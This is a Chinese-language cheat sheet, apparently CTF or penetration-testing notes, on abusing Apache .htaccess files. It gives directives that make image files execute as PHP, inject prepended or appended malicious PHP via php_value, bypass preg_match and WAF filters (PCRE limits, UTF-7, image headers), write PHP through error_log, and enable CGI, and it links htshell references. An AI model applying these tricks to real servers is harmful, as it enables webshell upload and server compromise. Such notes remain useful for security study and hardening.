# ``.htaccess``文件利用

### 正确解析绕过
  
  ``.htaccess``中出现的无法正常解析的条目时无法生效
  - ``\``换行绕过脏字符或绕WAF
  - 利用XMP图片解析头(``#``刚好是注释符)
    
    ```
    #define width 1
    #define height 1
    ```
  - 利用wbmp文件解析头
    
    ```
    \x00\x00\x8a\x39\x8a\x39
    ```
### 增加使用php解析 (可以类推)

- 文件后缀(.jpg)
  
    ```
    AddType application/x-httpd-php .jpg
    ```
- 的文件
  
    ```
    <FilesMatch "<filename>">
    SetHandler application/x-httpd-php
    </FilesMatch>
    ```

### **利用php_value注入php配置**

- 在所有php前后注入恶意php文件
  
    ```
    php_value auto_prepend_file "<FileDir>"
    php_value auto_append_file "<FileDir>"
    ```

- 利用prce参数绕过preg_match
  
    ```
    php_value pcre.backtrack_limit 0
    php_value pcre.jit 0 
    ```

    任意匹配均返回``FALSE``
    
    > https://www.php.net/manual/zh/pcre.configuration.php

- 利用UTF-7编码绕过日志html编码
  
   ```
    php_value zend.multibyte 1
    php_value zend.script_encoding "UTF-7"
   ```
- 利用inclue_path包含恶意文件

  ```
    php_value include_path "/tmp"
  ```
- 利用``error log``写本地文件 (html编码)

    ```
    php_value error_log /tmp/fl3g.php
    php_value error_reporting 32767
    ```
- 强制开启短标签
    
    ```
    php_value short_open_tag 1  
    ```

## CGI 相关

官方文档 https://httpd.apache.org/docs/2.4/howto/htaccess.html#cgi

>Finally, you may wish to use a .htaccess file to permit the execution of CGI programs in a particular directory. This may be implemented with the following configuration:
>```
>Options +ExecCGI
>AddHandler cgi-script cgi pl
>```

## htshell

参考链接 https://github.com/wireghoul/htshells/tree/master/info


## 参考资料

https://www.hacking8.com/MiscSecNotes/htaccess.html#title-9